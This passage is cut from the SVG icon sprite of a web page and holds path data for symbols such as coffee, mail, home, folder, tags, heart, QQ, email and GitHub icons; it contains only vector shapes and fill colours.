0 0 1 176.08695644-255.13043466v-39.13043467a332.21739112 332.21739112 0 0 1 586.95652179-212.08695645 256.69565244 256.69565244 0 0 1 39.13043466-3.13043467 273.91304356 273.91304356 0 0 1 273.91304356 253.5652169A273.91304356 273.91304356 0 0 1 1314.17391289 688.08695644z" fill="#54C3F1" ></path></symbol><symbol id="icon-kafei" viewBox="0 0 1024 1024"><path d="M600.240917 915.612201H242.325247a22.378321 22.378321 0 1 0 0 44.756642h357.91567a22.378321 22.378321 0 1 0 0-44.756642zM890.804233 479.094277h-149.899584v-61.19192a22.378321 22.378321 0 0 0-22.378321-22.378321H136.830645a22.378321 22.378321 0 0 0-22.378321 22.378321v140.99621c0 172.712685 140.513478 313.229359 313.226162 313.229359 67.262839 0 129.64081-21.316949 180.736912-57.544254 168.818857-4.498043 304.770354-143.224451 304.770353-313.111074a22.378321 22.378321 0 0 0-22.381518-22.378321z m-152.428335 119.708033h32.359053a196.267466 196.267466 0 0 1-43.845525 52.84161 311.176947 311.176947 0 0 0 11.486472-52.84161zM159.208966 558.898567v-118.617889h536.942238v118.617889c0 86.700009-41.348743 163.889232-105.325167 213.00645a22.343155 22.343155 0 0 0-7.631007 5.626549c-43.915857 31.329649-97.57907 49.836521-155.513347 49.836521-148.038987 0.003197-268.472717-120.43373-268.472717-268.46952z m507.016029 202.753982a314.894946 314.894946 0 0 0 27.60206-37.784196 241.020911 241.020911 0 0 0 131.888233-137.33256 22.244051 22.244051 0 0 0 2.368905-8.839436c0.025575-0.36125 0.047954-0.725697 0.054348-1.086947 0-0.063938 0.009591-0.124679 0.00959-0.188618 0-0.076726-0.009591-0.147058-0.012787-0.223783a22.371927 22.371927 0 0 0-14.756904-21.15071 22.298398 22.298398 0 0 0-11.297856-1.003828h-61.175935v-30.191552h126.517436c-9.55874 115.203597-92.102775 209.998164-201.19709 237.80163zM255.16401 295.07095c-17.57977 9.024857-44.142837 22.669239-44.142837 52.75849 0 12.359227 10.0127 22.311186 22.375124 22.311186 12.359227 0 22.375124-10.089426 22.375124-22.448653 1.40344-3.337567 13.39822-9.497999 19.843177-12.806793 17.57977-9.024857 44.146034-22.669239 44.146034-52.761687s-26.566264-43.73683-44.142837-52.764884c-6.444956-3.311992-18.442933-9.472424-19.823995-12.739659l-0.019182-0.354856c1.400244-3.337567 13.39822-9.497999 19.843177-12.80999 17.57977-9.028054 44.142837-22.672436 44.142837-52.764884 0-12.359227-10.0127-22.307989-22.375124-22.307989s-22.375124 10.089426-22.375124 22.448653c-1.400244 3.337567-13.39822 9.497999-19.843177 12.80999-17.57977 9.028054-44.142837 22.672436-44.142837 52.764884s26.566264 43.73683 44.142837 52.764884c6.444956 3.311992 18.442933 9.472424 19.823995 12.739658l0.019182 0.35166c-1.40344 3.337567-13.39822 9.501196-19.846374 12.80999zM430.69956 234.387337c-17.57977 9.024857-44.142837 22.669239-44.142837 52.75849 0 12.359227 10.0127 22.311186 22.375124 22.311187 12.359227 0 22.375124-10.089426 22.375124-22.448653 1.40344-3.337567 13.39822-9.497999 19.843177-12.806794 17.57977-9.024857 44.146034-22.669239 44.146034-52.761687s-26.566264-43.73683-44.142837-52.764884c-6.448153-3.311992-18.44613-9.472424-19.823995-12.739658l-0.019182-0.354857c1.400244-3.337567 13.39822-9.497999 19.846374-12.80999 17.57977-9.028054 44.142837-22.672436 44.142837-52.764884 0-12.359227-10.0127-22.307989-22.375124-22.307989s-22.375124 10.089426-22.375124 22.448653c-1.400244 3.337567-13.39822 9.497999-19.846374 12.80999-17.57977 9.028054-44.142837 22.672436-44.142837 52.764884s26.566264 43.73683 44.142837 52.764884c6.448153 3.311992 18.44613 9.472424 19.823995 12.739659l0.019182 0.351659c-1.40344 3.337567-13.401417 9.501196-19.846374 12.80999zM606.231913 295.07095c-17.57977 9.024857-44.142837 22.669239-44.142837 52.75849 0 12.359227 10.0127 22.311186 22.375124 22.311186 12.359227 0 22.375124-10.089426 22.375124-22.448653 1.40344-3.337567 13.39822-9.497999 19.843177-12.806793 17.57977-9.024857 44.146034-22.669239 44.146034-52.761687s-26.566264-43.73683-44.142837-52.764884c-6.448153-3.311992-18.44613-9.472424-19.823995-12.739659l-0.019182-0.354856c1.400244-3.337567 13.39822-9.497999 19.846374-12.80999 17.57977-9.028054 44.142837-22.672436 44.142837-52.764884 0-12.359227-10.0127-22.307989-22.375124-22.307989s-22.375124 10.089426-22.375124 22.448653c-1.400244 3.337567-13.39822 9.497999-19.846374 12.80999-17.57977 9.028054-44.142837 22.672436-44.142837 52.764884s26.566264 43.73683 44.142837 52.764884c6.448153 3.311992 18.44613 9.472424 19.823995 12.739658l0.019182 0.35166c-1.40344 3.337567-13.401417 9.501196-19.846374 12.80999z" fill="#009FE8" ></path></symbol><symbol id="icon-xinxi" viewBox="0 0 1024 1024"><path d="M102.381 219.559l3.619 0.052V198h814v32.135l-5.426 2.397 4.083 0.069c2.47-2.782 5.342-5.883 8.342-9.515v-26.327c0-1.561 0.1-2.758-0.208-3.758H97.931c-0.308 1-0.931 2.197-0.931 3.758v15.236c2 2.281 3.805 4.836 5.381 7.564zM926.741 704c0.331-1 0.259-2.282 0.259-3.92V272.316l-0.581 0.791-1.869 1.116-387.643 219.333c-6.287 5.659-13.822 9.423-21.504 10.681a34.968 34.968 0 0 1-5.658 0.468c-7.227 0-14.092-2.321-19.364-6.684L97 270.41v429.67c0 1.638 0.651 2.92 0.982 3.92h828.759z" fill="#FF9702" ></path><path d="M929.084 160H95.639C77.897 160 64 176.146 64 196.758V700.08C64 720.783 77.897 737 95.639 737h833.444C946.826 737 961 720.783 961 700.08V196.758C961 176.146 946.826 160 929.084 160z m11.882 72.954zM97.931 193h828.86c0.308 1 0.208 2.197 0.208 3.758v26.327c-3 3.632-5.891 6.733-8.361 9.515-0.413 0.465-0.714 0.922-1.112 1.371-4.026 4.539-7.248 8.23-11.334 12.401L518.776 465.564l-1.96 1.116-1.596 1.603c-1.831 1.832-3.525 2.629-4.556 2.942l-0.082-0.084-396.883-229.722c-1.416-2.336-3.53-6.635-5.025-9.674-0.446-0.906-0.704-1.805-1.147-2.699l-1.527-0.772v-2.639c-1-2.095-2.494-4.129-3.619-6.077-1.576-2.727-3.381-5.283-5.381-7.564v-15.236c0-1.561 0.623-2.758 0.931-3.758zM97 270.41l393.387 227.61c5.272 4.363 12.068 6.684 19.294 6.684 1.862 0 3.796-0.154 5.709-0.468 7.682-1.257 15.262-5.022 21.549-10.681l387.705-219.334 1.769-1.116 0.586-0.791V700.08c0 1.638 0.072 2.92-0.259 3.92H97.982c-0.331-1-0.982-2.282-0.982-3.92V270.41z" fill="" ></path><path d="M512.361 411.449L107.343 229.045c0.443 0.895 0.887 1.793 1.332 2.699 1.494 3.039 3.609 7.338 5.025 9.674L510.583 471.14l0.084 0.084c1.031-0.313 2.728-1.11 4.559-2.942l1.603-1.603 1.973-1.116 387.443-219.192c4.086-4.171 7.36-7.862 11.387-12.401l1.216-1.371-4.311-0.069-402.176 178.919zM102.718 219.559c1.126 1.948 2.282 3.982 3.282 6.077v-6.025l-3.282-0.052zM940.966 232.954z" fill="#FFFFFF" ></path><path d="M914.574 232.532l5.426-2.397V198H106v30.274l1.527 0.771 404.946 182.404z" fill="#F9F455" ></path></symbol><symbol id="icon-home" viewBox="0 0 1024 1024"><path d="M586.424 0C557.44 0 531.952 11.792 512 34.248 492.048 11.792 466.56 0 437.576 0c-58.552 0-104.424 48.664-104.424 110.792 0 65.208 50.704 108 120.88 167.232 12.24 10.328 24.904 21.016 38.32 32.64 5.64 4.896 12.64 7.336 19.648 7.336 7.008 0 14.008-2.44 19.648-7.328 13.416-11.632 26.08-22.32 38.32-32.656 65.072-54.92 120.88-99.624 120.88-167.224C690.848 48.664 644.976 0 586.424 0z m-55.152 232.16c-6.296 5.32-12.696 10.72-19.28 16.32a6454.4 6454.4 0 0 0-19.264-16.304c-67.248-56.76-99.576-85.632-99.576-121.384 0-25.24 15.264-50.792 44.424-50.792 32.216 0 44.672 39.704 45.536 42.592A29.872 29.872 0 0 0 512 124.896a29.872 29.872 0 0 0 28.888-22.304c0.864-2.888 13.32-42.592 45.536-42.592 29.16 0 44.424 25.552 44.424 50.792 0 37.248-37.832 69.264-99.576 121.376z m462.728 611.84a30 30 0 0 1 30 30v120a30 30 0 0 1-60 0v-30H904v30a30 30 0 0 1-60 0v-30h-62v30A30 30 0 0 1 752 1024H272a30 30 0 0 1-30-30v-30H180v30a30 30 0 0 1-60 0v-30H60v30a30 30 0 0 1-60 0v-120a30 30 0 0 1 60 0V904H120v-30a30 30 0 0 1 60 0V904h62V776.904c-34.096 12.08-75.064 2.824-100.272-28.696a89.896 89.896 0 0 1 14.08-126.496l299.888-241.904c33.192-26.544 79.416-26.544 112.512-0.08l300.096 242.08c38.664 30.872 45.112 87.512 13.96 126.408a89.76 89.76 0 0 1-100.264 28.608V904h62v-30a30 30 0 0 1 60 0V904h60v-30a30 30 0 0 1 30-30z m-452 120v-120h-60v120h60z m180 0V735.248L512 567.264 302 735.248V964h120v-150A30 30 0 0 1 452 784h120a30 30 0 0 1 30 30v150h120zM530.736 505.424l262.536 210a29.944 29.944 0 0 0 42.128-4.672 29.928 29.928 0 0 0-4.648-42.16L530.632 426.504a29.808 29.808 0 0 0-37.368 0.08L193.36 668.504a29.936 29.936 0 0 0-4.8 42.216 29.944 29.944 0 0 0 42.144 4.72l262.552-210.016a30 30 0 0 1 37.472 0z" fill="#4A90E2" ></path></symbol><symbol id="icon-folder" viewBox="0 0 1024 1024"><path d="M449.3 109.8l348.432 180.3a48 48 0 0 1 20.572 64.692l-184.788 357.1-433.696-224.42 184.788-357.104a48 48 0 0 1 64.692-20.568z" fill="#FFFFFF" ></path><path d="M728.56 265.64H314.56l-99.68 192.64v36.96l400.52 207.2h22.96l170.2-328.96v-28a80 80 0 0 0-80-79.84z" fill="#CBECF9" ></path><path d="M633.52 720a8 8 0 0 1-3.68-0.88L196 494.52a8 8 0 0 1-3.44-10.8l184.88-357.08a56 56 0 0 1 75.48-24l348.44 180.28a56 56 0 0 1 24 75.48l-184.76 357.08a8 8 0 0 1-7.08 4.52zM210.6 484l419.48 217.04 181.08-350a40 40 0 0 0-17.16-53.92l-348.44-180.28a40 40 0 0 0-53.88 17.16z" fill="#2FB1EA" ></path><path d="M294.88 297.64h433.68a48 48 0 0 1 48 48v324.8H246.88v-324.8a48 48 0 0 1 48-48z" fill="#6DD0FC" ></path><path d="M294.88 297.64h396.84a48 48 0 0 1 48 48v324.8H246.88v-324.8a48 48 0 0 1 48-48z" fill="#A4ECFF" ></path><path d="M776.56 670.44v-228.8h-313.6l-53.24-68.28a71.56 71.56 0 0 0-56.76-27.72H246.88v324.8z" fill="#6DD0FC" ></path><path d="M776.56 678.44H246.88a8 8 0 0 1-8-8v-324.8a56 56 0 0 1 56-56h433.68a56 56 0 0 1 56 56v324.8a8 8 0 0 1-8 8z m-521.68-16h513.68v-316.8a40 40 0 0 0-40-40H294.88a40 40 0 0 0-40 40z" fill="#2FB1EA" ></path><path d="M815.72 919.64H208.28a32 32 0 0 1-32-32v-470a32 32 0 0 1 32-32h144.64a32 32 0 0 1 25.24 12.32l55.64 71.36a32 32 0 0 0 25.24 12.32h356.68a32 32 0 0 1 32 32v374a32 32 0 0 1-32 32z" fill="#FFC444" ></path><path d="M775.72 879.64H208.28a32 32 0 0 1-32-32v-430a32 32 0 0 1 32-32h144.64a32 32 0 0 1 25.24 12.32l55.64 71.36a32 32 0 0 0 25.24 12.32h316.68a32 32 0 0 1 32 32v334a32 32 0 0 1-32 32z" fill="#FFE76E" ></path><path d="M815.72 927.64H208.28a40 40 0 0 1-40-40v-470a40 40 0 0 1 40-40h144.64a39.76 39.76 0 0 1 31.56 15.4L440 464.4a24 24 0 0 0 18.92 9.24h356.68a40 40 0 0 1 40 40v374a40 40 0 0 1-39.88 40zM208.28 393.64a24 24 0 0 0-24 24v470a24 24 0 0 0 24 24h607.44a24 24 0 0 0 24-24v-374a24 24 0 0 0-24-24h-356.68a39.76 39.76 0 0 1-31.56-15.4L372 402.88a24 24 0 0 0-18.92-9.24z" fill="#2FB1EA" ></path><path d="M76 684m-20 0a20 20 0 1 0 40 0 20 20 0 1 0-40 0Z" fill="#D4FFD4" ></path><path d="M512 32m-16 0a16 16 0 1 0 32 0 16 16 0 1 0-32 0Z" fill="#D4FFD4" ></path><path d="M992 460m-12 0a12 12 0 1 0 24 0 12 12 0 1 0-24 0Z" fill="#D4FFD4" ></path><path d="M756 1000m-8 0a8 8 0 1 0 16 0 8 8 0 1 0-16 0Z" fill="#D4FFD4" ></path><path d="M872 796m-4 0a4 4 0 1 0 8 0 4 4 0 1 0-8 0Z" fill="#D4FFD4" ></path><path d="M996 708m-20 0a20 20 0 1 0 40 0 20 20 0 1 0-40 0Z" fill="#FFBDBD" ></path><path d="M248 964m-16 0a16 16 0 1 0 32 0 16 16 0 1 0-32 0Z" fill="#FFBDBD" ></path><path d="M76 460m-12 0a12 12 0 1 0 24 0 12 12 0 1 0-24 0Z" fill="#FFBDBD" ></path><path d="M96 788m-8 0a8 8 0 1 0 16 0 8 8 0 1 0-16 0Z" fill="#FFBDBD" ></path><path d="M340 960m-4 0a4 4 0 1 0 8 0 4 4 0 1 0-8 0Z" fill="#FFBDBD" ></path><path d="M248 176m-20 0a20 20 0 1 0 40 0 20 20 0 1 0-40 0Z" fill="#BBF1FF" ></path><path d="M936 368m-16 0a16 16 0 1 0 32 0 16 16 0 1 0-32 0Z" fill="#BBF1FF" ></path><path d="M524 976m-12 0a12 12 0 1 0 24 0 12 12 0 1 0-24 0Z" fill="#BBF1FF" ></path><path d="M920 112m-8 0a8 8 0 1 0 16 0 8 8 0 1 0-16 0Z" fill="#BBF1FF" ></path><path d="M856 188m-4 0a4 4 0 1 0 8 0 4 4 0 1 0-8 0Z" fill="#BBF1FF" ></path><path d="M28 228m-20 0a20 20 0 1 0 40 0 20 20 0 1 0-40 0Z" fill="#FFF4C5" ></path><path d="M936 560m-16 0a16 16 0 1 0 32 0 16 16 0 1 0-32 0Z" fill="#FFF4C5" ></path><path d="M712 140m-12 0a12 12 0 1 0 24 0 12 12 0 1 0-24 0Z" fill="#FFF4C5" ></path><path d="M168 196m-8 0a8 8 0 1 0 16 0 8 8 0 1 0-16 0Z" fill="#FFF4C5" ></path><path d="M628 964m-4 0a4 4 0 1 0 8 0 4 4 0 1 0-8 0Z" fill="#FFF4C5" ></path></symbol><symbol id="icon-tags" viewBox="0 0 1024 1024"><path d="M0 0h1024v1024H0z" fill="#FFFFFF" ></path><path d="M324.88448 106.7008a81.92 81.92 0 0 1 59.392-40.1408l201.33888-28.68224a81.92 81.92 0 0 1 87.56224 50.55488l75.8272 188.70272a81.92 81.92 0 0 1-5.0688 71.50592L439.54176 875.8784a81.92 81.92 0 0 1-111.90272 29.98272L50.46272 745.84064A81.92 81.92 0 0 1 20.48 633.93792L324.88448 106.7008z" fill="#E36130" ></path><path d="M317.44 251.11552a81.92 81.92 0 0 1 34.22208-66.60096l209.92-150.35392a81.92 81.92 0 0 1 95.39584 0l209.92 150.35392A81.92 81.92 0 0 1 901.12 251.11552V931.84a81.92 81.92 0 0 1-81.92 81.92H399.36a81.92 81.92 0 0 1-81.92-81.92V251.11552z" fill="#FF7744" ></path><path d="M614.4 235.52m-71.68 0a71.68 71.68 0 1 0 143.36 0 71.68 71.68 0 1 0-143.36 0Z" fill="#E36130" ></path><path d="M705.7408 174.7968a189.32736 189.32736 0 0 1 166.44096-99.19488h5.3248c13.1584 0 25.94816 4.27008 36.46464 12.17536 33.536 25.1904 32.13312 76.04224-2.75456 99.328l-3.65568 2.4576a74.38336 74.38336 0 0 1 28.2624 58.368v1.30048l11.59168-7.74144c72.33536-48.30208 75.25376-153.7536 5.70368-206.00832A125.8496 125.8496 0 0 0 877.5168 10.24h-5.33504A254.55616 254.55616 0 0 0 648.3968 143.616l-40.28416 74.3424a32.70656 32.70656 0 0 0 13.1072 44.31872c15.83104 8.6016 35.6352 2.73408 44.2368-13.12768l40.28416-74.3424z" fill="#FFA17E" ></path><path d="M614.4 440.32l50.31936 125.30688 134.71744 9.13408-103.6288 86.56896 32.95232 130.94912L614.4 720.4864l-114.36032 71.79264 32.94208-130.94912-103.6288-86.56896 134.72768-9.13408z" fill="#FFA17E" ></path></symbol><symbol id="icon-aixin" viewBox="0 0 1024 1024"><path d="M428 590c246-90 298-77 473-100-90 147-288 227-288 227s-29-20-45-31c-73 46-197 113-197 113s-75-41-112-72-117-103-117-103 200.565-2.743 286-34z" fill="#FAE1C5" ></path><path d="M482.708 677.966c-5.808 0-11.567-2.518-15.521-7.373-6.974-8.565-5.684-21.163 2.881-28.137 18.459-15.03 33.745-30.86 45.431-47.052C535.738 567.366 546 537.623 546 507c0-11.046 8.954-20 20-20s20 8.954 20 20c0 39.201-12.808 76.821-38.066 111.815-13.735 19.029-31.436 37.419-52.609 54.658a19.915 19.915 0 0 1-12.617 4.493zM733.013 575c-5.808 0-11.567-2.518-15.521-7.373-6.975-8.565-5.685-21.163 2.881-28.137 22.154-18.039 67.847-66.703 80.938-84.839 23.722-32.864 35.75-67.766 35.75-103.734 0-11.046 8.954-20 20-20s20 8.954 20 20c0 44.547-14.574 87.325-43.316 127.146-16.258 22.523-64.845 73.498-88.115 92.445A19.923 19.923 0 0 1 733.013 575z" fill="#EA952A" ></path><path d="M745.629 163a200.265 200.265 0 0 0-136.476 53.664A200.269 200.269 0 0 0 472.678 163c-52.238 0-101.687 19.99-139.235 56.288-32.033 30.966-52.5 70.974-58.931 114.42A170.62 170.62 0 0 0 259.01 333c-93.738 0-170 76.262-170 170 0 51.245 16.786 100.483 49.892 146.349 18.123 25.105 41.512 49.396 69.519 72.199 39.404 32.084 77.414 52.749 84.634 56.566l79.451 42.001 79.451-42.002c7.22-3.816 45.23-24.481 84.634-56.565a463.63 463.63 0 0 0 14.369-12.196l58.194 30.764 93.647-49.507c8.627-4.562 54.045-29.261 101.104-67.577 33.404-27.2 61.284-56.151 82.866-86.049C926.073 482.537 946 424.125 946 363.372 946 252.886 856.114 163 745.629 163zM511.335 690.529c-36.486 29.708-71.438 48.714-78.073 52.222l-60.756 32.118-60.756-32.117c-6.636-3.509-41.587-22.515-78.074-52.223-25.292-20.593-46.267-42.325-62.34-64.592C143.25 587.028 129.01 545.666 129.01 503c0-71.682 58.318-130 130-130 37.777 0 73.631 16.403 98.368 45.004l15.127 17.489 15.127-17.489C412.37 389.403 448.224 373 486 373c71.682 0 130 58.318 130 130 0 42.667-14.24 84.029-42.325 122.937-16.072 22.266-37.047 43.999-62.34 64.592zM854.339 513.57c-19.533 27.062-44.999 53.453-75.688 78.442-44.144 35.942-86.505 58.982-94.546 63.234l-74.95 39.622-28.159-14.886c9.234-10.042 17.63-20.269 25.113-30.636C639.214 603.484 656 554.246 656 503c0-93.738-76.262-170-170-170a169.902 169.902 0 0 0-113.495 43.434 169.973 169.973 0 0 0-58.788-34.389C324.094 262.931 391.167 203 472.678 203c46.602 0 90.833 20.235 121.349 55.517l15.128 17.489 15.126-17.49C654.796 223.235 699.025 203 745.629 203 834.058 203 906 274.942 906 363.372c0 52.175-17.381 102.709-51.661 150.198z" fill="#EA952A" ></path></symbol><symbol id="icon-qq" viewBox="0 0 1024 1024"><path d="M68.399765 590.615655c-37.073602 90.765025-43.465533 176.418105-14.062849 191.757941 20.45478 11.505876 53.692423-14.061849 84.374094-60.084355 11.504876 51.135451 42.186547 95.87897 84.373094 132.952572-44.743519 16.619821-74.146204 44.743519-74.146204 75.42519 0 51.135451 79.259149 93.321998 176.418105 93.321997 88.208052 0 161.07627-33.237643 175.138119-77.982162h20.45478C535.009753 990.751357 607.87897 1023.989 696.087023 1023.989c98.436943 0 176.418105-40.908561 176.418104-93.321997 0-30.68167-29.402684-58.806368-74.146203-75.42519 42.186547-37.073602 72.868217-81.817121 84.374094-132.952572 30.68067 46.022506 62.640327 71.589231 84.373093 60.084355 30.68167-15.339835 24.289739-102.270901-14.061849-191.757941-29.403684-70.311245-69.033258-122.725682-99.714929-134.230558 0-3.835959 1.278986-8.949904 1.278987-14.062849 0-26.845712-7.669918-52.413437-20.454781-72.868217v-5.112945c0-12.783863-2.555973-24.289739-7.669917-34.516629C818.813704 145.736434 701.200968 0 510.722014 0 320.24206 0 202.630323 145.736434 194.959406 329.824457c-5.112945 10.22689-7.669918 21.732767-7.669918 34.516629v5.112945c-12.783863 20.45478-20.45478 46.022506-20.45478 72.869217v14.061849c-28.123698 11.504876-69.032258 62.640327-98.434943 134.230558z" fill="#4CAFE9" ></path></symbol><symbol id="icon-QQ1" viewBox="0 0 1024 1024"><path d="M511.09761 957.257c-80.159 0-153.737-25.019-201.11-62.386-24.057 6.702-54.831 17.489-74.252 30.864-16.617 11.439-14.546 23.106-11.55 27.816 13.15 20.689 225.583 13.211 286.912 6.767v-3.061z" fill="#FAAD08" ></path><path d="M496.65061 957.257c80.157 0 153.737-25.019 201.11-62.386 24.057 6.702 54.83 17.489 74.253 30.864 16.616 11.439 14.543 23.106 11.55 27.816-13.15 20.689-225.584 13.211-286.914 6.767v-3.061z" fill="#FAAD08" ></path><path d="M497.12861 474.524c131.934-0.876 237.669-25.783 273.497-35.34 8.541-2.28 13.11-6.364 13.11-6.364 0.03-1.172 0.542-20.952 0.542-31.155C784.27761 229.833 701.12561 57.173 496.64061 57.162 292.15661 57.173 209.00061 229.832 209.00061 401.665c0 10.203 0.516 29.983 0.547 31.155 0 0 3.717 3.821 10.529 5.67 33.078 8.98 140.803 35.139 276.08 36.034h0.972z" fill="#000000" ></path><path d="M860.28261 619.782c-8.12-26.086-19.204-56.506-30.427-85.72 0 0-6.456-0.795-9.718 0.148-100.71 29.205-222.773 47.818-315.792 46.695h-0.962C410.88561 582.017 289.65061 563.617 189.27961 534.698 185.44461 533.595 177.87261 534.063 177.87261 534.063 166.64961 563.276 155.56661 593.696 147.44761 619.782 108.72961 744.168 121.27261 795.644 130.82461 796.798c20.496 2.474 79.78-93.637 79.78-93.637 0 97.66 88.324 247.617 290.576 248.996a718.01 718.01 0 0 1 5.367 0C708.80161 950.778 797.12261 800.822 797.12261 703.162c0 0 59.284 96.111 79.783 93.637 9.55-1.154 22.093-52.63-16.623-177.017" fill="#000000" ></path><path d="M434.38261 316.917c-27.9 1.24-51.745-30.106-53.24-69.956-1.518-39.877 19.858-73.207 47.764-74.454 27.875-1.224 51.703 30.109 53.218 69.974 1.527 39.877-19.853 73.2-47.742 74.436m206.67-69.956c-1.494 39.85-25.34 71.194-53.24 69.956-27.888-1.238-49.269-34.559-47.742-74.435 1.513-39.868 25.341-71.201 53.216-69.974 27.909 1.247 49.285 34.576 47.767 74.453" fill="#FFFFFF" ></path><path d="M683.94261 368.627c-7.323-17.609-81.062-37.227-172.353-37.227h-0.98c-91.29 0-165.031 19.618-172.352 37.227a6.244 6.244 0 0 0-0.535 2.505c0 1.269 0.393 2.414 1.006 3.386 6.168 9.765 88.054 58.018 171.882 58.018h0.98c83.827 0 165.71-48.25 171.881-58.016a6.352 6.352 0 0 0 1.002-3.395c0-0.897-0.2-1.736-0.531-2.498" fill="#FAAD08" ></path><path d="M467.63161 256.377c1.26 15.886-7.377 30-19.266 31.542-11.907 1.544-22.569-10.083-23.836-25.978-1.243-15.895 7.381-30.008 19.25-31.538 11.927-1.549 22.607 10.088 23.852 25.974m73.097 7.935c2.533-4.118 19.827-25.77 55.62-17.886 9.401 2.07 13.75 5.116 14.668 6.316 1.355 1.77 1.726 4.29 0.352 7.684-2.722 6.725-8.338 6.542-11.454 5.226-2.01-0.85-26.94-15.889-49.905 6.553-1.579 1.545-4.405 2.074-7.085 0.242-2.678-1.834-3.786-5.553-2.196-8.135" fill="#000000" ></path><path d="M504.33261 584.495h-0.967c-63.568 0.752-140.646-7.504-215.286-21.92-6.391 36.262-10.25 81.838-6.936 136.196 8.37 137.384 91.62 223.736 220.118 224.996H506.48461c128.498-1.26 211.748-87.612 220.12-224.996 3.314-54.362-0.547-99.938-6.94-136.203-74.654 14.423-151.745 22.684-215.332 21.927" fill="#FFFFFF" ></path><path d="M323.27461 577.016v137.468s64.957 12.705 130.031 3.91V591.59c-41.225-2.262-85.688-7.304-130.031-14.574" fill="#EB1C26" ></path><path d="M788.09761 432.536s-121.98 40.387-283.743 41.539h-0.962c-161.497-1.147-283.328-41.401-283.744-41.539l-40.854 106.952c102.186 32.31 228.837 53.135 324.598 51.926l0.96-0.002c95.768 1.216 222.4-19.61 324.6-51.924l-40.855-106.952z" fill="#EB1C26" ></path></symbol><symbol id="icon-shijianzhou" viewBox="0 0 1024 1024"><path d="M562.3 344.5h283.5c18.6 0 33.6-15 33.6-33.6s-15-33.6-33.6-33.6H562.3c-18.6 0-33.6 15-33.6 33.6s15.1 33.6 33.6 33.6zM845.8 663.3H562.3c-18.6 0-33.6 15-33.6 33.6s15 33.6 33.6 33.6h283.5c18.6 0 33.6-15 33.6-33.6 0-18.5-15-33.6-33.6-33.6zM412.5 310.9c0-62.3-42.7-114.8-100.4-129.7V98.7c0-18.6-15-33.6-33.6-33.6s-33.6 15-33.6 33.6v82.4c-57.7 14.9-100.4 67.4-100.4 129.7S187.3 425.6 245 440.6v126.7c-57.7 14.9-100.4 67.4-100.4 129.7S187.3 811.7 245 826.6v98.6c0 18.6 15 33.6 33.6 33.6s33.6-15 33.6-33.6v-98.6c57.7-14.9 100.4-67.4 100.4-129.7s-42.7-114.8-100.4-129.7V440.6c57.6-15 100.3-67.5 100.3-129.7z m-200.7 0c0-36.8 30-66.8 66.8-66.8s66.8 30 66.8 66.8-30 66.8-66.8 66.8c-36.9-0.1-66.8-30-66.8-66.8z m133.5 386c0 36.8-30 66.8-66.8 66.8s-66.8-30-66.8-66.8 30-66.8 66.8-66.8c36.9 0.1 66.8 30 66.8 66.8z" fill="#1677FF" ></path></symbol><symbol id="icon-QQ" viewBox="0 0 1024 1024"><path d="M512.268258 64.433103c-247.183323 0-447.569968 200.380501-447.569968 447.563825 0 247.189467 200.385621 447.570992 447.569968 447.570992s447.569968-200.380501 447.569968-447.569968c0-247.184347-200.386645-447.564849-447.569968-447.564849z m252.85872 584.692787c-18.997168 16.287968-43.668709-53.628042-47.2134-42.875198-8.642616 26.161294-12.695154 43.646184-38.148944 72.127602-1.35972 1.521494 29.43056 12.647032 38.148944 36.396051 8.346713 22.756875 24.596797 58.811973-81.725503 70.125906-62.389428 6.635801-107.471099-33.244533-111.964932-32.85648-8.325212 0.734126-4.618747 0-13.568528 0-7.321804 0-7.807126 0.534468-14.69685 0-1.899307-0.140272-22.632985 32.85648-115.364231 32.85648-71.878798 0-90.48177-45.243445-76.032701-70.125906 14.464428-24.877342 38.579999-32.122354 35.176604-36.06636-16.73643-19.39546-28.287904-40.1404-35.176604-58.882621-1.705793-4.666869-3.135137-9.209848-4.262434-13.574672-2.611931-10.008479-22.627866 58.76385-44.111028 42.875198-21.483162-15.883533-19.567472-56.309597-5.659014-95.003248 14.033372-39.006959 49.37687-76.562049 49.771065-84.854496 1.412962-30.849665-3.044011-35.975235 0-44.078263 6.780169-18.149391 15.034732-11.190043 15.034733-20.609788 0-118.64476 88.172909-214.829571 196.933079-214.829571 108.755051 0 196.928984 96.184811 196.928984 214.829571 0 4.554242 11.815637 0 17.474651 20.609788 1.165181 4.256291 1.968931 20.684531 0.58771 44.078263-0.658358 11.238165 29.954789 24.914202 45.777913 84.854496 15.845649 59.945414 0 88.215912-7.909514 95.003248z" fill="#68A5E1" ></path></symbol><symbol id="icon-email" viewBox="0 0 1327 1024"><path d="M755.5951025 848.8816325a31.20979594 31.20979594 0 0 0 31.22938687-31.22938781 31.20979594 31.20979594 0 0 0-31.22938687-31.23918375h-597.15918375c-35.2848975 0-64.23183657-28.70204063-64.2318375-64.26122437V149.72734719c0-5.84816343 1.27346906-11.43183657 2.7918375-16.76081625l442.03102031 384a31.1216325 31.1216325 0 0 0 20.30693813 7.61142843c7.36653094 0 14.4783675-2.53714313 20.316735-7.61142843l446.08653092-387.30122438c2.54693906 6.34775531 4.06530656 12.95020406 4.06530564 20.06204063v222.72979592a31.20979594 31.20979594 0 0 0 31.2293878 31.23918376 31.20979594 31.20979594 0 0 0 31.22938782-31.24897968V149.72734719c0-64.26122437-52.31020406-116.57142844-116.53224468-116.57142844H148.54204063c-29.2016325 0-55.86612281 10.91265281-76.17306094 28.70204062-0.50938781 0.49959187-1.01877562 1.00897969-1.77306094 1.5183675C46.98775531 84.70204062 32 115.43183657 32 149.71755125V722.41632688c0 69.58040813 56.62040813 126.46530656 126.43591875 126.46530562h597.15918375zM559.58857156 452.19591875L148.54204063 95.37959188h821.84816343L559.58857156 452.18612281z m347.58857157 237.46285687h246.02448937V625.14285687c0-51.04653094-41.38775531-92.44408125-92.42448937-92.44408125-38.33142844 0-72.09795938 23.1183675-86.06693907 58.92244876a31.08244875 31.08244875 0 0 1-40.36897968 17.52489843 31.10204063 31.10204063 0 0 1-17.51510157-40.38857156c23.35346906-59.676735 79.71918375-98.28244875 143.95102032-98.28244875 85.31265281 0 154.62857156 69.33551062 154.62857156 154.66775437v64.76081626c33.25714313 0.50938781 60.16653094 27.683265 60.16653 60.95020406v178.28571469a61.22448938 61.22448938 0 0 1-61.18530563 61.2048975H907.16734719a61.22448938 61.22448938 0 0 1-61.1951025-61.2048975v-178.28571469a61.22448938 61.22448938 0 0 1 61.1951025-61.2048975z m306.19102032 238.22693907V751.87265281H908.44081625v176.00326594h304.9273472z" fill="#20A0FF" ></path></symbol><symbol id="icon-github" viewBox="0 0 1024 1024"><path d="M512 0C229.283787 0 0.142041 234.942803 0.142041 524.867683c0 231.829001 146.647305 428.553077 350.068189 497.952484 25.592898 4.819996 